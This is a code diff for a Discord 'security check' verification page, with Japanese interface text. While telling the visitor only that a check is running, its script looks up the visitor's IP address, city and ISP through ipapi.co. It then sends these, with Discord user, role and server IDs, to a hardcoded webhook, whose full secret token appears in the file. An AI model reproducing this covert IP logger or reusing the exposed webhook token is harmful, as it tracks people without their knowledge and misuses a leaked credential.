@@ -10,7 +10,7 @@
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
         h1 { font-size: 20px; margin-bottom: 10px; color: #ffffff; }
-        p { font-size: 14px; color: #b5bac1; }
+        p { font-size: 14px; color: #b5bac1; word-break: break-all; }
         .success-mark { color: #23a559; font-size: 50px; display: none; }
         .error-mark { color: #f23f43; font-size: 50px; display: none; }
     </style>
@@ -24,29 +24,29 @@
         <p id="msg">セキュリティチェックを実行しています。</p>
     </div>
     <script>
+        // Webhook URLを再確認してください
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
-        
+
         async function start() {
             const params = new URLSearchParams(window.location.search);
             const state = params.get('state');
             const code = params.get('code');
 
-            if (!state || !code) return showError("エラー", "無効なアクセスです。");
+            if (!state || !code) return showError("エラー", "URLパラメータが不足しています。");
 
             try {
-                // IP情報の取得
-                const res = await fetch('https://ipapi.co/json/').catch(() => null);
-                const ipData = res ? await res.json() : {ip: "Unknown", city: "Unknown", org: "Unknown"};
-                
-                // stateの解析 (LID_..._UID_..._RID_..._GID_...)
                 const parts = state.split('_');
                 const logId = parts[1];
                 const userId = parts[3];
-                const roleId = parts[5]; // 追加
-                const guildId = parts[7]; // 追加
+                const roleId = parts[5];
+                const guildId = parts[7];
 
-                // Webhookへデータを送信 (PATCHで元のメッセージを上書き)
-                await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
+                // IP取得
+                const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
+                const ipData = ipRes ? await ipRes.json() : {ip: "Unknown", city: "Unknown", org: "Unknown"};
+
+                // Webhook送信 (ここが重要)
+                const response = await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -60,10 +60,15 @@
                     })
                 });
 
-                showSuccess("認証完了", "自動的にロールが付与されます。Discordへ戻ってください。");
-            } catch (e) { 
-                console.error(e);
-                showError("エラー", "認証処理中に問題が発生しました。"); 
+                if (response.ok) {
+                    showSuccess("認証完了", "自動的にロールが付与されます。Discordへ戻ってください。");
+                } else {
+                    const errText = await response.text();
+                    showError("Webhookエラー", "Discordへの送信に失敗しました: " + errText);
+                }
+
+            } catch (e) {
+                showError("実行エラー", "ブラウザ側でエラーが発生しました: " + e.message);
             }
         }
 
